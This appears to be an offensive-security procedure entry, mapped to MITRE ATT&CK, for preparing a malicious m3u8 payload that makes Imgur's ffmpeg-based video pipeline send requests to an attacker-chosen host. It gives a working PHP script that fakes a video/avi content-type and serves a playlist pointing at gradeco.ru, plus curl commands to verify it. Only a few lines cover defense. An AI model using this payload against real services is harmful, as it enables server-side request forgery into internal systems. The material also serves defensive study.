---
id: proc-imgur-m3u8-prep-001
tags:
  - ssrf
  - payload
  - m3u8
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:37.540Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Prepare-Malicious-m3u8-Payload-for-SSRF

## Summary

This procedure creates a PHP-based payload that serves HLS m3u8 playlist content disguised with a video/avi content-type header, bypassing Imgur's validation and enabling ffmpeg to parse it for SSRF.

## Description

In the attack on Imgur's vidgif service, attackers host a PHP script on their server that outputs m3u8 playlist data. When Imgur fetches this via HTTP GET after a HEAD check, ffmpeg ignores the content-type and processes the m3u8, making requests to URLs embedded in the playlist. This allows arbitrary HTTP requests to internal or external destinations. Prerequisites include a web server capable of running PHP and hosting on a domain like gradeco.ru.

## Requirements

1. PHP-enabled web server (e.g., Apache with PHP)
2. Publicly accessible domain for hosting
3. Basic knowledge of HTTP headers and m3u8 format

## Defense

Defensive measures and detection strategies:

- Validate and sanitize user-supplied URLs strictly, rejecting non-video content
- Use allowlists for domains and monitor outbound traffic from media processing services
- Implement content-type verification beyond headers, scanning actual content

## Objectives

1. Bypass Imgur's content-type checks
2. Trick ffmpeg into parsing m3u8 for SSRF
3. Enable arbitrary requests from Imgur's server

## Instructions

### Step 1: Create PHP Payload Script

**Context**: Write a PHP file that sets fake video headers and outputs m3u8 content with an attacker URL.

No command required; create file manually:

```php
<?php
header('Content-Type: video/avi');
header('Content-Length: 1234');
echo '#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nhttp://www.gradeco.ru:12346/BASICSSRF\n#EXT-X-ENDLIST\n';
?>
```

> Save as m3u8-ssrf.php and host on your server. Test with curl -I http://yourserver/m3u8-ssrf.php to verify Content-Type: video/avi.

### Step 2: Verify Payload Serving

**Context**: Ensure the script serves correctly without errors.

Use curl to fetch:

```bash
curl -v http://yourserver/m3u8-ssrf.php
```

> Expected output includes video/avi header and m3u8 body. Success if headers match and content parses as playlist.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- ssrf
- m3u8
- payload
